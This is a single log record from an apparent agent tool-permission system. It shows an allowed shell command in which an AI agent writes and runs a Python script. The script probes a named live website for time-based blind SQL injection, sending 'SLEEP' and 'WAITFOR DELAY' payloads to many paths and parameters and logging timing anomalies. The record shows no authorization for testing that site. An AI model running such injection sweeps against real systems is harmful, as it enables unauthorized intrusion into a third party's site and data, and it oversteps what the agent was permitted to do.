{"ts": 1790725754.8614352, "decision_id": "2ea37c29e2ae", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work && cat > tool_outputs/sweep.py <<'PYEOF'\nimport subprocess, hashlib, urllib.parse, time, json\nT=\"https://www.infinitycapital.bh\"\ndef fetch(path, method=\"GET\", data=None, ctype=None, hdrs=None, out=\"/tmp/s.bin\"):\n    cmd=[\"curl\",\"-s\",\"-o\",out,\"-D\",\"/tmp/s.h\",\"-w\",\"%{http_code}|%{size_download}|%{time_total}\",\"-X\",method,\n         \"-H\",\"Cache-Control: no-cache\"]\n    for k,v in (hdrs or {}).items(): cmd+=[\"-H\",f\"{k}: {v}\"]\n    if data: cmd+=[\"--data-binary\",data]\n    if ctype: cmd+=[\"-H\",f\"Content-Type: {ctype}\"]\n    cmd+=[T+path]\n    r=subprocess.run(cmd,capture_output=True,text=True)\n    st=r.stdout.strip().split(\"|\")\n    body=open(out,\"rb\").read()\n    h=open(\"/tmp/s.h\",errors=\"ignore\").read()\n    code=st[0]; ln=int(st[1]) if st[1].isdigit() else 0; t=float(st[2]) if len(st)>2 else 0\n    return code,ln,t,hashlib.sha256(body).hexdigest()[:12],body,h\n\npaths = [\"/\",\"/contact\",\"/404\",\"/api/\",\"/api?id=1\",\"/_next/image\"]\nparams = [\"id\",\"page\",\"search\",\"q\",\"url\",\"w\",\"zzz\",\"cb\",\"x\",\"$p\"]\nprint(\"### TIME-BASED BLIND (baseline vs sleep payloads) ###\")\nresults={}\nfor p in paths:\n    for prm in params:\n        base = p if \"?\" in p else p\n        b_code,b_len,b_t,b_h,_,_ = fetch(base+(\"&\" if \"?\" in p else \"?\")+urllib.parse.urlencode({prm:\"1\"}))\n        # SLEEP payload\n        sp = urllib.parse.urlencode({prm:\"1' AND SLEEP(6)-- -\"})\n        s_code,s_len,s_t,s_h,_,_ = fetch(base+(\"&\" if \"?\" in p else \"?\")+sp)\n        sp2 = urllib.parse.urlencode({prm:\"1; WAITFOR DELAY '0:0:6'-- -\"})\n        s2 = fetch(base+(\"&\" if \"?\" in p else \"?\")+sp2)\n        delta = s_t - b_t\n        flag = \"  <<< TIME ANOMALY\" if delta > 3.0 else \"\"\n        if delta > 1.5 or s2[2] - b_t > 3.0:\n            print(f\"  {p} ?{prm}: base_t={b_t:.2f} sleep_t={s_t:.2f} waitfor_t={s2[2]:.2f}{flag}\")\n        results[(p,prm)] = (b_t,s_t,s2[2],b_h,s_h)\n        time.sleep(0.3)\nprint(\"done time sweep\")\njson.dump({str(k):v for k,v in results.items()}, open(\"tool_outputs/sweep_time.json\",\"w\"), indent=1)\nPYEOF\ntimeout 280 python3 tool_outputs/sweep.py 2>&1 | tee tool_outputs/sweep_time.log"}
